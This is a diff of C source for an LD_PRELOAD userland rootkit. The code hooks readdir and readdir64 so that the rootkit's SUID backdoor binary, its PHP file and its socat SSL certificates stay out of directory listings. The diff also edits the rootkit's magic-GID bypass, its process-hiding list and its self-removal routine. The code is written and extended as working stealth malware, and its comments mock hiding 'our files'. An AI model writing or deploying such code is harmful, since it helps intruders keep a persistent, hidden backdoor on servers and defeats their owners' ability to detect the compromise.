@@ -120,21 +120,6 @@ char *get_fdname(int fd){
 }
 
 
-int snodew(void){
-    if(getgid() == MAGIC_GID) return 1;
-    if(getenv(MAGIC_VAR) != NULL) return 1;    
-    return 0;
-}
-
-/* ignore all of these when determining
- * if a process is hidden or not. */
-static char *const procignore[21] = {"sys", "uptime", "meminfo", "bus",
-                                     "cgroups", "cmdline", "cpuinfo",
-                                     "filesystems", "interrupts",
-                                     "loadavg", "mounts", "net",
-                                     "self", "stat", "tty", "version",
-                                     "version_signature", "osrelease",
-                                     "pid_max", "min_free_kbytes", NULL};
 /*
     FILE & PROCESS HIDING UTILITIES.
  */
@@ -188,9 +173,9 @@ int _hidden_path(const char *pathname, short mode){
         if(iswww()){
             if(strstr(pathname, SUID_BIN)) return 0;
             if(strstr(pathname, PHP_NEWFILENAME)) return 0;
-#if defined(SERVERPEM) && defined(CLIENTCRT)
-            if(strstr(pathname, SERVERPEM)) return 0;
-            if(strstr(pathname, CLIENTCRT)) return 0;
+#if defined(SERVERCRT) && defined(CLIENTPEM)
+            if(strstr(pathname, CLIENTPEM)) return 0;
+            if(strstr(pathname, SERVERCRT)) return 0;
 #endif
         }
 
@@ -222,9 +207,9 @@ int _hidden_lpath(const char *pathname, short mode){
         if(iswww()){
             if(strstr(pathname, SUID_BIN)) return 0;
             if(strstr(pathname, PHP_NEWFILENAME)) return 0;
-#if defined(SERVERPEM) && defined(CLIENTCRT)
-            if(strstr(pathname, SERVERPEM)) return 0;
-            if(strstr(pathname, CLIENTCRT)) return 0;
+#if defined(SERVERCRT) && defined(CLIENTPEM)
+            if(strstr(pathname, SERVERCRT)) return 0;
+            if(strstr(pathname, CLIENTPEM)) return 0;
 #endif
         }
 
@@ -274,13 +259,13 @@ int _hidden_fd(int fd, short mode){
                 goto end_hiddenfd;
             }
         }
-#if defined(SERVERPEM) && defined(CLIENTCRT)
+#if defined(SERVERCRT) && defined(CLIENTPEM)
         if(process("socat")){  /* let socat access ssl cert */
-            if(strstr(pathname, SERVERPEM)){
+            if(strstr(pathname, SERVERCRT)){
                 ret = 0;
                 goto end_hiddenfd;
             }
-            if(strstr(pathname, CLIENTCRT)){
+            if(strstr(pathname, CLIENTPEM)){
                 ret = 0;
                 goto end_hiddenfd;
             }
@@ -437,33 +422,6 @@ FILE *forge_procnet(const char *pathname){
     fclose(pnt);
     fseek(tmp, 0, SEEK_SET);
     return tmp;
-}
-
-void killself(short mode){
-    if(geteuid() != 0){
-        if(mode == KILLSELF_OUTPUT)
-            printf("inadequate permissions\n");
-        return;
-    }
-    getsym(o_unlink, "unlink");
-    for(int i = 0; rmfiles[i] != NULL; i++){
-        if(o_unlink(rmfiles[i]) < 0){
-            if(mode == KILLSELF_OUTPUT)
-                printf("something went wrong removing %s\n", rmfiles[i]);
-        }else{
-            if(mode == KILLSELF_OUTPUT)
-                printf("successfully removed %s\n", rmfiles[i]);
-        }
-    }
-    //SERVERPEM,CLIENTCRT
-#if defined(CLIENTPEM) && defined(SERVERCRT)
-    if(o_unlink(CLIENTPEM) < 0){
-        printf("something went wrong removing %s\n", CLIENTPEM);
-    }else printf("successfully removed %s\n", CLIENTPEM);
-    if(o_unlink(SERVERCRT) < 0){
-        printf("something went wrong removing %s\n", SERVERCRT);
-    }else printf("successfully removed %s\n", SERVERCRT);
-#endif
 }
 
 int ld_inconsistent(void){
@@ -816,13 +774,21 @@ end_fchdir:
     return o_fchdir(fd);
 }
 
+#if defined(SERVERCRT) && defined(CLIENTPEM)                          /* when the service user is allowed to access these files, */
+static char *const hidefiles[6] = {PHP_NEWFILENAME, SUID_BIN,         /* let them access them as usual, but don't let them show  */
+                                   SERVERCRT, CLIENTPEM, NULL};       /* in directory listings. we still hiding our files boi.   */
+#else
+static char *const hidefiles[3] = {PHP_NEWFILENAME, SUID_BIN, NULL};
+#endif
 struct dirent *readdir(DIR *dirp){
-    char path[PATH_MAX], *filename;
+    char path[PATH_MAX], *filename, *hidefile;
     struct dirent *dir;
+    int hide;
 
     getsym(o_readdir, "readdir");
 
     do{
+        hide = 0;
         dir = o_readdir(dirp);
         if(snodew()) return dir;
 
@@ -830,20 +796,32 @@ struct dirent *readdir(DIR *dirp){
         if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
             continue;
 
-        filename = get_fdname(dirfd(dirp));
-        snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
-        free(filename);
-    }while(dir && hidden_path(path));
+        for(int i = 0; hidefiles[i] != NULL; i++){
+            hidefile = hidefiles[i];
+            if(strstr(hidefile, dir->d_name)){
+                hide = 1;
+                break;
+            }
+        }
+
+        if(hide != 1){  /* don't do this if it isn't necessary */
+            filename = get_fdname(dirfd(dirp));
+            snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
+            free(filename);
+        }
+    }while(dir && (hidden_path(path) || hide));
 
     return dir;
 }
 struct dirent64 *readdir64(DIR *dirp){
-    char path[PATH_MAX], *filename;
+    char path[PATH_MAX], *filename, *hidefile;
     struct dirent64 *dir;
+    int hide;
 
     getsym(o_readdir64, "readdir64");
 
     do{
+        hide = 0;
         dir = o_readdir64(dirp);
         if(snodew()) return dir;
 
@@ -851,10 +829,20 @@ struct dirent64 *readdir64(DIR *dirp){
         if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
             continue;
 
-        filename = get_fdname(dirfd(dirp));
-        snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
-        free(filename);
-    }while(dir && hidden_path(path));
+        for(int i = 0; hidefiles[i] != NULL; i++){
+            hidefile = hidefiles[i];
+            if(strstr(hidefile, dir->d_name)){
+                hide = 1;
+                break;
+            }
+        }
+
+        if(hide != 1){
+            filename = get_fdname(dirfd(dirp));
+            snprintf(path, sizeof(path), "%s/%s", filename, dir->d_name);
+            free(filename);
+        }
+    }while(dir && (hidden_path(path) || hide));
 
     return dir;
 }
